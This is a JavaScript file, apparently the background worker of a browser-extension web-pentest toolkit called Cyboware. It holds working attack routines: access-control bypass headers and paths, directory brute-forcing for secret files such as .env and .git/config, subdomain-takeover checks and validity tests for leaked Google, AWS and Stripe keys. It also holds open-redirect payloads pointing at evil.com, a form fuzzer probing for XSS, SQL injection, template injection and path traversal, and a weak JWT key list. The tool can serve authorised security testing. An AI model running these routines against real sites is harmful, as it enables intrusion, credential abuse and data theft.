      { type: 'header', name: 'X-Rewrite-URL: ' + path, headers: { 'X-Rewrite-URL': path } },
      { type: 'header', name: 'X-Custom-IP-Authorization: 127.0.0.1', headers: { 'X-Custom-IP-Authorization': '127.0.0.1' } },
      { type: 'header', name: 'X-Real-IP: 127.0.0.1', headers: { 'X-Real-IP': '127.0.0.1' } },
      { type: 'header', name: 'Referer: ' + u.origin, headers: { 'Referer': u.origin + '/' } },
      { type: 'path', name: path + '/', url: u.origin + path + '/' },
      { type: 'path', name: path + '..;/', url: u.origin + path + '..;/' },
      { type: 'path', name: '/.' + path, url: u.origin + '/.' + path },
      { type: 'path', name: path + '%20', url: u.origin + path + '%20' },
      { type: 'path', name: path + '%09', url: u.origin + path + '%09' },
      { type: 'path', name: path + '?', url: u.origin + path + '?' },
      { type: 'path', name: path + '#', url: u.origin + path + '%23' },
      { type: 'path', name: path + '.json', url: u.origin + path + '.json' },
      { type: 'path', name: '/' + path.split('/').pop(), url: u.origin + '/' + path.split('/').pop() },
      { type: 'header', name: 'X-HTTP-Method-Override: GET', headers: { 'X-HTTP-Method-Override': 'GET' }, method: 'POST' },
    ];
    try {
      // Baseline: target URL
      let baseStatus, baseBody = '';
      try { const br = await fetch(url, { credentials: 'include', signal: AbortSignal.timeout(5000) }); baseStatus = br.status; baseBody = await br.text(); } catch { baseStatus = 0; }

      // Homepage baseline: to filter false bypasses that just redirect home
      let homeBody = '';
      try { const hr = await fetch(u.origin + '/', { credentials: 'include', signal: AbortSignal.timeout(5000) }); homeBody = await hr.text(); } catch {}

      // Login page baseline: common redirect target
      let loginBody = '';
      try { const lr = await fetch(u.origin + '/login', { credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(3000) }); loginBody = await lr.text(); } catch {}

      const results = [{ technique: 'Baseline', status: baseStatus, type: 'baseline' }];
      for (const t of techniques) {
        try {
          const opts = { method: t.method || 'GET', headers: t.headers || {}, redirect: 'manual', credentials: 'include', signal: AbortSignal.timeout(5000) };
          const testUrl = t.url || url;
          const r = await fetch(testUrl, opts);
          const statusBypass = r.status >= 200 && r.status < 400 && baseStatus >= 400;
          let bypass = statusBypass;
          let verdict = '';
          let preview = '';

          // Enhanced: compare body against homepage/login to detect false bypasses
          if (statusBypass && r.status === 200) {
            const body = await r.text();
            preview = body.slice(0, 200);
            const similarToHome = homeBody && Math.abs(body.length - homeBody.length) < 200;
            const similarToLogin = loginBody && Math.abs(body.length - loginBody.length) < 200;
            if (similarToHome) {
              bypass = false;
              verdict = 'Returns homepage (not a real bypass)';
            } else if (similarToLogin) {
              bypass = false;
              verdict = 'Redirects to login (not a real bypass)';
            } else {
              verdict = 'Different content returned — investigate!';
            }
          } else if (statusBypass && (r.status === 301 || r.status === 302)) {
            const loc = r.headers.get('location') || '';
            if (loc.includes('login') || loc.includes('signin') || loc === u.origin + '/') {
              bypass = false;
              verdict = 'Redirects to ' + loc.split('/').pop() + ' (not a real bypass)';
            }
          }

          results.push({ technique: t.name, type: t.type, status: r.status, bypass, verdict, url: testUrl, preview: bypass ? preview : '' });
        } catch (e) {
          results.push({ technique: t.name, type: t.type, status: 'err', error: e.message });
        }
      }
      sr({ ok: true, baseStatus, results });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // ═══ METHOD TESTER — Enhanced: TRACE echo detection ═══
  METHOD_TEST: async (msg, _, sr) => {
    const methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD', 'TRACE'];
    try {
      let baseBody = '', baseStatus = 0, baseHeaders = {};
      try {
        const br = await fetch(msg.url, { credentials: 'include', signal: AbortSignal.timeout(5000) });
        baseBody = await br.text(); baseStatus = br.status;
        br.headers.forEach((v, k) => { baseHeaders[k] = v; });
      } catch {}

      const results = [{ method: 'GET', status: baseStatus, bodyLen: baseBody.length, headers: baseHeaders, baseline: true }];
      for (const method of methods.slice(1)) {
        try {
          const r = await fetch(msg.url, { method, credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(5000), headers: { 'X-Cyboware-Trace-Test': 'CyboTraceMarker42' } });
          const body = method === 'HEAD' ? '' : await r.text();
          const rh = {}; r.headers.forEach((v, k) => { rh[k] = v; });
          const allow = rh['allow'] || '';
          const bodyDiff = method !== 'HEAD' ? Math.abs(body.length - baseBody.length) : 0;
          const sameAsGet = bodyDiff < 50;
          const accepted = r.status >= 200 && r.status < 400;
          const realDanger = accepted && !sameAsGet && ['PUT','DELETE','PATCH','TRACE'].includes(method);
          const fakeAccept = accepted && sameAsGet && ['PUT','DELETE','PATCH'].includes(method);

          // Enhanced: TRACE echo detection
          let traceEcho = false;
          if (method === 'TRACE' && accepted) {
            traceEcho = body.includes('CyboTraceMarker42') || body.includes('X-Cyboware-Trace-Test');
          }

          results.push({ method, status: r.status, bodyLen: body.length, bodyDiff, sameAsGet, realDanger, fakeAccept, traceEcho, allow, headers: rh, preview: (realDanger || traceEcho) ? body.slice(0, 300) : '' });
        } catch (e) {
          results.push({ method, status: 'err', error: e.message });
        }
      }
      sr({ ok: true, results });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // Probe endpoints
  PROBE_ENDPOINTS: async (msg, _, sr) => {
    const results = [];
    const origin = new URL(msg.baseUrl).origin;
    const eps = msg.endpoints.slice(0, 40);
    for (let i = 0; i < eps.length; i += 8) {
      const batch = eps.slice(i, i + 8);
      const promises = batch.map(async (ep) => {
        const url = ep.startsWith('http') ? ep : origin + (ep.startsWith('/') ? ep : '/' + ep);
        try {
          const r = await fetch(url, { method: 'HEAD', redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(5000) });
          return { endpoint: ep, url, status: r.status };
        } catch {
          try {
            const r = await fetch(url, { redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(5000) });
            const len = (await r.text()).length;
            return { endpoint: ep, url, status: r.status, size: len };
          } catch { return { endpoint: ep, url, status: 'err' }; }
        }
      });
      (await Promise.all(promises)).forEach(r => results.push(r));
    }
    sr({ ok: true, results });
  },

  // Probe links
  PROBE_LINKS: async (msg, _, sr) => {
    const results = [];
    const links = msg.links.slice(0, 30).filter(u => {
      try { new URL(u); return true; } catch { return false; }
    });
    for (let i = 0; i < links.length; i += 8) {
      const batch = links.slice(i, i + 8);
      const promises = batch.map(async (url) => {
        try {
          const r = await fetch(url, { method: 'HEAD', redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(5000) });
          return { url, status: r.status, finalUrl: r.url !== url ? r.url : '' };
        } catch {
          try {
            const r = await fetch(url, { redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(5000) });
            return { url, status: r.status, finalUrl: r.url !== url ? r.url : '' };
          } catch (e) {
            return { url, status: 'dead', error: e.message?.includes('timeout') ? 'Timeout' : 'Connection failed' };
          }
        }
      });
      (await Promise.all(promises)).forEach(r => results.push(r));
    }
    sr({ ok: true, results });
  },

  // Probe subdomains
  PROBE_SUBDOMAINS: async (msg, _, sr) => {
    const results = [];
    const subs = msg.subdomains.slice(0, 50);
    for (let i = 0; i < subs.length; i += 10) {
      const batch = subs.slice(i, i + 10);
      const promises = batch.map(async (sub) => {
        try {
          const r = await fetch(`https://${sub}`, { redirect: 'follow', signal: AbortSignal.timeout(3000) });
          let title = '';
          if (r.status === 200) {
            try {
              const html = await r.text();
              const m = html.match(/<title[^>]*>([^<]{0,100})/i);
              if (m) title = m[1].trim();
            } catch {}
          }
          return { sub, status: r.status, title, url: r.url };
        } catch (e) {
          try {
            const r2 = await fetch(`http://${sub}`, { redirect: 'follow', signal: AbortSignal.timeout(3000) });
            return { sub, status: r2.status, title: '', url: r2.url, http: true };
          } catch {
            return { sub, status: 'dead', error: e.message?.includes('fetch') ? 'No response' : e.message };
          }
        }
      });
      (await Promise.all(promises)).forEach(r => results.push(r));
    }
    sr({ ok: true, results });
  },

  // ═══ DIR BRUTE — Enhanced: redirect destination check, body hash comparison ═══
  DIR_BRUTE: async (msg, _, sr) => {
    const pathSets = {
      common: ['/.git/HEAD', '/.env', '/robots.txt', '/sitemap.xml', '/.well-known/security.txt', '/admin', '/login', '/dashboard', '/graphql', '/api', '/swagger.json', '/.DS_Store', '/backup.zip', '/config.json', '/package.json', '/debug', '/console', '/server-status'],
      wordpress: ['/wp-login.php', '/wp-admin/', '/wp-config.php', '/wp-config.php.bak', '/wp-config.php.old', '/wp-content/', '/wp-includes/', '/wp-json/', '/wp-json/wp/v2/users', '/xmlrpc.php', '/wp-cron.php', '/readme.html', '/license.txt', '/wp-content/debug.log', '/wp-content/uploads/', '/wp-content/plugins/', '/wp-admin/install.php'],
      php_laravel: ['/phpinfo.php', '/info.php', '/test.php', '/.env', '/.env.local', '/.env.production', '/.env.backup', '/storage/logs/laravel.log', '/vendor/', '/artisan', '/telescope', '/horizon', '/nova', '/_debugbar', '/config/app.php'],
      java_spring: ['/actuator', '/actuator/health', '/actuator/env', '/actuator/mappings', '/actuator/beans', '/actuator/configprops', '/actuator/heapdump', '/swagger-ui.html', '/swagger.json', '/v2/api-docs', '/v3/api-docs', '/jolokia', '/console', '/h2-console', '/druid'],
      dotnet: ['/web.config', '/elmah.axd', '/trace.axd', '/Trace.axd', '/applicationinsights', '/_blazor', '/api/swagger', '/hangfire', '/miniprofiler', '/Elmah', '/Error'],
      node_js: ['/package.json', '/package-lock.json', '/.npmrc', '/node_modules/', '/server.js', '/app.js', '/.env', '/config.json', '/graphql', '/graphiql', '/__webpack_hmr', '/_next/data', '/api/health'],
      devops: ['/.git/HEAD', '/.git/config', '/.gitignore', '/.svn/entries', '/.hg/', '/CVS/Root', '/.dockerenv', '/Dockerfile', '/docker-compose.yml', '/.github/', '/.gitlab-ci.yml', '/Jenkinsfile', '/.circleci/config.yml', '/Makefile'],
      backups: ['/backup', '/backup.zip', '/backup.tar.gz', '/backup.sql', '/dump.sql', '/db.sql', '/database.sql', '/site.tar.gz', '/www.zip', '/.bak', '/old/', '/copy/', '/temp/'],
    };
    const category = msg.category || 'common';
    const paths = category === 'all' ? [...new Set(Object.values(pathSets).flat())] : pathSets[category] || pathSets.common;

    try {
      const u = new URL(msg.url);
      const origin = u.origin;
      const parentDir = u.pathname.replace(/\/[^/]*$/, '/');
      const currentAsDir = u.pathname.endsWith('/') ? u.pathname : u.pathname + '/';
      const bases = new Set();
      if (msg.scope === 'current') {
        if (parentDir !== '/') bases.add(parentDir);
        if (currentAsDir !== '/' && currentAsDir !== parentDir) bases.add(currentAsDir);
        if (!bases.size) bases.add('');
      } else if (msg.scope === 'root') {
        bases.add('');
      } else {
        bases.add('');
        if (parentDir !== '/') bases.add(parentDir);
        if (currentAsDir !== '/' && currentAsDir !== parentDir) bases.add(currentAsDir);
      }

      const results = [];
      // Baseline 404
      let baselineLen = 0;
      let baselineHash = '';
      try {
        const br = await fetch(origin + '/cyboware-404-test-' + Date.now(), { redirect: 'manual', credentials: 'include', signal: AbortSignal.timeout(2000) });
        if (br.status === 200) {
          const bt = await br.text();
          baselineLen = bt.length;
          baselineHash = simpleHash(bt);
        }
      } catch {}

      // Homepage baseline for redirect detection
      let homeLen = 0;
      let homeHash = '';
      try {
        const hr = await fetch(origin + '/', { redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(2000) });
        const ht = await hr.text();
        homeLen = ht.length;
        homeHash = simpleHash(ht);
      } catch {}

      const allPaths = [];
      bases.forEach(base => { paths.forEach(p => {
        const joined = base ? (base + p).replace(/\/\//g, '/') : p;
        allPaths.push(joined);
      }); });
      const uniquePaths = [...new Set(allPaths)];

      // Track redirect destinations to detect catch-all redirects
      const redirectDests = new Map();

      for (let i = 0; i < uniquePaths.length; i += 8) {
        const batch = uniquePaths.slice(i, i + 8);
        const promises = batch.map(async (path) => {
          try {
            const r = await fetch(origin + path, { redirect: 'manual', credentials: 'include', signal: AbortSignal.timeout(2000) });
            const interesting = r.status === 200 || r.status === 301 || r.status === 302 || r.status === 401 || r.status === 403;
            if (interesting) {
              let preview = '';
              let bodyLen = 0;
              let bodyHash = '';

              if (r.status === 200) {
                try {
                  const body = await r.text();
                  preview = body.slice(0, 200);
                  bodyLen = body.length;
                  bodyHash = simpleHash(body);
                } catch {}
                // Skip SPA catch-all
                if (baselineLen > 0 && Math.abs(bodyLen - baselineLen) < 200) return null;
                if (baselineHash && bodyHash === baselineHash) return null;
                // Skip if identical to homepage
                if (homeHash && bodyHash === homeHash) return null;
              }

              // Track redirects
              if (r.status === 301 || r.status === 302) {
                const loc = r.headers.get('location') || '';
                redirectDests.set(path, loc);
                // If redirect goes to login or home, mark it
                if (loc.includes('login') || loc.includes('signin') || loc === origin + '/' || loc === '/') {
                  return { path, status: r.status, preview: 'Redirects to: ' + loc, bodyLen: 0, isRedirectCatchall: true };
                }
              }

              return { path, status: r.status, preview, bodyLen };
            }
          } catch {}
          return null;
        });
        (await Promise.all(promises)).forEach(r => { if (r) results.push(r); });
      }
      sr({ ok: true, results, total: uniquePaths.length, category });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // ═══ SUBDOMAIN TAKEOVER — Enhanced: better error classification ═══
  CHECK_TAKEOVER: async (msg, _, sr) => {
    const fingerprints = [
      { service: 'GitHub Pages', cnames: ['github.io'], body: "There isn't a GitHub Pages site here" },
      { service: 'Heroku', cnames: ['herokuapp.com','herokussl.com'], body: 'No such app' },
      { service: 'AWS S3', cnames: ['s3.amazonaws.com','s3-website'], body: 'NoSuchBucket' },
      { service: 'Shopify', cnames: ['myshopify.com'], body: 'Sorry, this shop is currently unavailable' },
      { service: 'Tumblr', cnames: ['tumblr.com'], body: "There's nothing here" },
      { service: 'WordPress.com', cnames: ['wordpress.com'], body: "doesn't exist" },
      { service: 'Ghost', cnames: ['ghost.io'], body: 'The thing you were looking for is no longer here' },
      { service: 'Surge.sh', cnames: ['surge.sh'], body: 'project not found' },
      { service: 'Bitbucket', cnames: ['bitbucket.io'], body: 'Repository not found' },
      { service: 'Pantheon', cnames: ['pantheonsite.io'], body: '404 error unknown site' },
      { service: 'Fastly', cnames: ['fastly.net'], body: 'Fastly error: unknown domain' },
      { service: 'Zendesk', cnames: ['zendesk.com'], body: 'Help Center Closed' },
      { service: 'Unbounce', cnames: ['unbouncepages.com'], body: 'The requested URL was not found' },
      { service: 'Fly.io', cnames: ['fly.dev','edgeapp.net'], body: 'not found' },
      { service: 'Azure', cnames: ['azurewebsites.net','cloudapp.azure.com','trafficmanager.net'], body: '' },
      { service: 'Google Cloud', cnames: ['appspot.com'], body: '' },
    ];
    try {
      const results = [];
      for (const sub of msg.subdomains.slice(0, 30)) {
        try {
          const dns = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(sub)}&type=CNAME`);
          const d = await dns.json();
          const cnames = d.Answer ? d.Answer.filter(a => a.type === 5).map(a => a.data.replace(/\.$/, '')) : [];
          if (!cnames.length) continue;

          for (const cname of cnames) {
            for (const fp of fingerprints) {
              if (fp.cnames.some(c => cname.includes(c))) {
                let vulnerable = false;
                let errorType = '';
                if (fp.body) {
                  try {
                    const r = await fetch(`https://${sub}`, { signal: AbortSignal.timeout(5000) });
                    const body = await r.text();
                    vulnerable = body.includes(fp.body);
                  } catch (e) {
                    // Enhanced: classify connection errors instead of assuming vulnerable
                    const msg = e.message || '';
                    if (msg.includes('ERR_NAME_NOT_RESOLVED') || msg.includes('NXDOMAIN')) {
                      vulnerable = true;
                      errorType = 'DNS_NXDOMAIN';
                    } else if (msg.includes('ERR_CONNECTION_REFUSED')) {
                      errorType = 'CONNECTION_REFUSED';
                      // Moderate signal — could be takeover or just down
                    } else {
                      errorType = 'TIMEOUT';
                      // Weak signal — don't mark as vulnerable
                    }
                  }
                } else {
                  // Services without body fingerprint (Azure, GCP) — check DNS only
                  try {
                    const dnsA = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(sub)}&type=A`);
                    const dA = await dnsA.json();
                    if (!dA.Answer || dA.Answer.length === 0) {
                      vulnerable = true;
                      errorType = 'NO_A_RECORD';
                    }
                  } catch {}
                }
                results.push({ subdomain: sub, cname, service: fp.service, vulnerable, errorType, fingerprint: fp.body || '(DNS check)' });
              }
            }
          }
        } catch {}
      }
      sr({ ok: true, results });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // Test Google API key
  TEST_GOOGLE_KEY: async (msg, _, sr) => {
    try {
      const r = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?key=${msg.key}&address=test`);
      const d = await r.json();
      sr({ ok: true, status: d.status, error_message: d.error_message || '' });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // Test AWS key
  TEST_AWS_KEY: async (msg, _, sr) => {
    try {
      // Try to call STS GetCallerIdentity
      const r = await fetch('https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15', {
        headers: { 'Authorization': `AWS4-HMAC-SHA256 Credential=${msg.key}/20260101/us-east-1/sts/aws4_request` },
        signal: AbortSignal.timeout(5000)
      });
      const text = await r.text();
      const isValid = r.status !== 403 && text.includes('GetCallerIdentityResult');
      sr({ ok: true, valid: isValid, status: r.status, response: text.slice(0, 300) });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },


  // ═══ OPEN REDIRECT ACTIVE TESTER ═══
  TEST_REDIRECT: async (msg, _, sr) => {
    const targetUrl = msg.url;
    const paramName = msg.param;
    const payloads = [
      { p: 'https://evil.com', label: 'Absolute URL' },
      { p: '//evil.com', label: 'Protocol-relative' },
      { p: '/\\evil.com', label: 'Backslash bypass' },
      { p: '/\\/evil.com', label: 'Double backslash' },
      { p: 'https://evil.com%00.target.com', label: 'Null byte' },
      { p: 'https://evil.com%0d%0a', label: 'CRLF injection' },
      { p: '/%09/evil.com', label: 'Tab bypass' },
      { p: 'https://target.com@evil.com', label: 'At-sign bypass' },
      { p: 'https://evil.com#target.com', label: 'Fragment bypass' },
      { p: 'https://evil.com?.target.com', label: 'Query bypass' },
      { p: 'javascript:alert(1)', label: 'JavaScript URI' },
      { p: 'data:text/html,<script>alert(1)</script>', label: 'Data URI' },
    ];
    const results = [];
    for (const { p: payload, label } of payloads) {
      try {
        const testUrl = new URL(targetUrl);
        testUrl.searchParams.set(paramName, payload);
        const r = await fetch(testUrl.toString(), { credentials: 'include', redirect: 'manual', signal: AbortSignal.timeout(5000) });
        const location = r.headers.get('location') || '';
        const isRedirect = r.status >= 300 && r.status < 400;
        const redirectsToEvil = isRedirect && (location.includes('evil.com') || location.includes('javascript:') || location.includes('data:'));
        const reflected = !isRedirect && r.status === 200;
        let bodyCheck = '';
        if (reflected) {
          const body = await r.text();
          if (body.includes(payload)) bodyCheck = 'Payload reflected in response body';
        }
        results.push({ payload, label, status: r.status, location, isRedirect, redirectsToEvil, bodyCheck, url: testUrl.toString() });
      } catch (e) {
        results.push({ payload, label, status: 'err', error: e.message });
      }
    }
    sr({ ok: true, results });
  },
  // Test Stripe key
  TEST_STRIPE_KEY: async (msg, _, sr) => {
    try {
      const r = await fetch('https://api.stripe.com/v1/charges?limit=1', {
        headers: { 'Authorization': `Bearer ${msg.key}` },
        signal: AbortSignal.timeout(5000)
      });
      sr({ ok: true, valid: r.status === 200, status: r.status });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // ═══ FORM FIELD FUZZER — POST/GET form submission with payloads ═══
  FUZZ_FORM: async (msg, _, sr) => {
    const { action, method, fields, payloads, category, selectedFields, frozenFields } = msg;
    const sqliErrors = ['sql syntax', 'mysql', 'sqlite', 'postgresql', 'ora-', 'syntax error', 'unclosed quotation', 'unterminated string', 'SQLSTATE', 'microsoft sql', 'odbc', 'jdbc', 'quoted string not properly terminated'];
    const results = [];

    // Baseline: submit form with original values
    let baselineLen = 0, baselineBody = '', baselineTime = 0;
    try {
      const baseData = new URLSearchParams();
      fields.forEach(f => baseData.append(f.name, f.value || 'test'));
      const t0 = Date.now();
      const baseOpts = method.toUpperCase() === 'POST'
        ? { method: 'POST', body: baseData.toString(), headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(10000) }
        : { method: 'GET', credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(10000) };
      const baseUrl = method.toUpperCase() === 'GET' ? action + '?' + baseData.toString() : action;
      const br = await fetch(baseUrl, baseOpts);
      baselineTime = Date.now() - t0;
      baselineBody = await br.text();
      baselineLen = baselineBody.length;
    } catch {}

    // Test each field with each payload
    for (const field of fields) {
      if (!field.name) continue;
      for (const { p: payload, check, expect } of payloads) {
        const formData = new URLSearchParams();
        fields.forEach(f => {
          formData.append(f.name, f.name === field.name ? payload : (f.value || 'test'));
        });

        try {
          const t0 = Date.now();
          const opts = method.toUpperCase() === 'POST'
            ? { method: 'POST', body: formData.toString(), headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(15000) }
            : { method: 'GET', credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(15000) };
          const testUrl = method.toUpperCase() === 'GET' ? action + '?' + formData.toString() : action;
          const r = await fetch(testUrl, opts);
          const elapsed = Date.now() - t0;
          const body = await r.text();
          const rawReflected = body.includes(payload);

          let severity = 'safe', analysis = '', context = '';

          if (rawReflected) {
            const idx = body.indexOf(payload);
            context = body.slice(Math.max(0, idx - 80), Math.min(body.length, idx + payload.length + 80));
          }

          if (check === 'unencoded_html') {
            const htmlEncoded = body.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
            if (rawReflected && !htmlEncoded) { severity = 'high'; analysis = 'Payload reflected UNENCODED — likely XSS!'; }
            else if (htmlEncoded) { severity = 'safe'; analysis = 'HTML-encoded (safe)'; }
            else { severity = 'safe'; analysis = 'Not reflected'; }
          } else if (check === 'unencoded_attr') {
            if (rawReflected && context.includes('"')) { severity = 'high'; analysis = 'Quote reflected unencoded — attribute breakout'; }
            else { severity = rawReflected ? 'low' : 'safe'; analysis = rawReflected ? 'Reflected but quotes encoded' : 'Not reflected'; }
          } else if (check === 'sqli_error') {
            const bodyLower = body.toLowerCase();
            const errorFound = sqliErrors.find(e => bodyLower.includes(e));
            const errorInBaseline = errorFound && baselineBody.toLowerCase().includes(errorFound);
            if (errorFound && !errorInBaseline) { severity = 'high'; analysis = 'SQL error: "' + errorFound + '"';
              const errIdx = bodyLower.indexOf(errorFound);
              context = body.slice(Math.max(0, errIdx - 40), Math.min(body.length, errIdx + errorFound.length + 80));
            } else if (r.status === 500 && baselineBody !== body) { severity = 'medium'; analysis = 'Server error (500) on payload'; }
            else { severity = 'safe'; analysis = 'No SQL errors'; }
          } else if (check === 'sqli_blind_time') {
            const timeDiff = elapsed - baselineTime;
            if (timeDiff > 3000) { severity = 'high'; analysis = `Response delayed ${(elapsed/1000).toFixed(1)}s (baseline ${(baselineTime/1000).toFixed(1)}s) — blind SQLi confirmed!`; }
            else if (timeDiff > 1500) { severity = 'medium'; analysis = `Slight delay ${(elapsed/1000).toFixed(1)}s (baseline ${(baselineTime/1000).toFixed(1)}s) — investigate`; }
            else { severity = 'safe'; analysis = `No delay (${(elapsed/1000).toFixed(1)}s)`; }
          } else if (check === 'ssti_eval') {
            const evalRegex = new RegExp('(?<![0-9a-fA-F])' + expect + '(?![0-9a-fA-F])');
            const evalMatch = evalRegex.exec(body);
            if (evalMatch && !rawReflected && !baselineBody.includes(expect)) { severity = 'high'; analysis = 'Template expression EVALUATED — ' + payload + ' = ' + expect; context = body.slice(Math.max(0, evalMatch.index - 40), Math.min(body.length, evalMatch.index + expect.length + 40)); }
            else { severity = 'safe'; analysis = rawReflected ? 'Literal echoed (not evaluated)' : 'Not reflected'; }
          } else if (check === 'file_content') {
            const indicators = ['root:', '/bin/bash', '/bin/sh', 'daemon:', 'nobody:'];
            const found = indicators.find(f => body.includes(f));
            if (found) { severity = 'high'; analysis = 'File content: "' + found + '" — path traversal!'; }
            else { severity = 'safe'; analysis = 'No file content'; }
          } else {
            severity = rawReflected ? 'low' : 'safe';
            analysis = rawReflected ? 'Reflected (review manually)' : 'Not reflected';
          }

          let errorBody = '';
          if (r.status >= 500 && body.length < 5000) errorBody = body.slice(0, 500);

          results.push({ field: field.name, fieldType: field.type, payload, severity, analysis, status: r.status, bodyLen: body.length, elapsed, context: severity !== 'safe' ? context : '', errorBody, responsePreview: body.slice(0, 600), requestBody: formData.toString(), requestUrl: testUrl });
        } catch (e) {
          results.push({ field: field.name, fieldType: field.type, payload, severity: 'info', analysis: 'Request failed: ' + e.message });
        }
      }
    }
    sr({ ok: true, results, baselineLen, baselineTime, method: method.toUpperCase(), action });
  },

  // JWT weak key brute-force
  JWT_BRUTEFORCE: async (msg, _, sr) => {
    const commonKeys = ['secret', 'password', 'key', 'jwt', '123456', 'changeme', 'admin', 'test', 'letmein', 'welcome', 'monkey', 'master', 'qwerty', 'abc123', 'iloveyou', 'password1'];
    // Add domain-based keys
    if (msg.domain) {
      commonKeys.push(msg.domain, msg.domain.replace(/\./g, ''), msg.domain.split('.')[0]);
    }
    // We can't do real HMAC in service worker without SubtleCrypto for HS256,
    // but we can try the alg:none trick and report which keys were attempted
    sr({ ok: true, keysAttempted: commonKeys, note: 'Browser-side HMAC verification requires SubtleCrypto. Keys listed for manual testing with jwt.io or jwt_tool.' });
  }
};

// ═══ HELPER: Simple string hash for body comparison ═══
function simpleHash(str) {
  let hash = 0;
  const sample = str.length > 2000 ? str.slice(0, 1000) + str.slice(-1000) : str;
  for (let i = 0; i < sample.length; i++) {
    const ch = sample.charCodeAt(i);
    hash = ((hash << 5) - hash) + ch;
    hash = hash & hash;
  }
  return String(hash);
}
